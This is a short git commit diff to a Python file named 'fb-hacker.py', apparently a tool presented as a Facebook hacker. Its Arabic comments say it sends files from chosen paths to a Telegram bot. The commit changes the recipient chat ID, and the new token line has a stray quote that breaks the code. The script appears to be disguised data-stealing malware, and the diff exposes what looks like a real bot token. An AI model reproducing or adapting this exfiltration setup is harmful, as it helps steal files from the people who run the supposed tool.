74c9251465fbfbe526b4258a156a5c44f4998d01
Jak890 <143541473+Jak890@users.noreply.github.com>
2023-08-29 20:54:55 +0300

    Update fb-hacker.py

--- fb-hacker.py
+++ fb-hacker.py
@@ -7,8 +7,8 @@ from pystyle import *
 
 
 # بيانات البوت والمستخدم المرسل إليه
-bot_token = '6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M'
-chat_id = '802140429'
+bot_token = '6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M''
+chat_id = '6062583210'
 os.system('clear')
 
 # المسارات التي تحتوي على الملفات التي تريد إرسالها
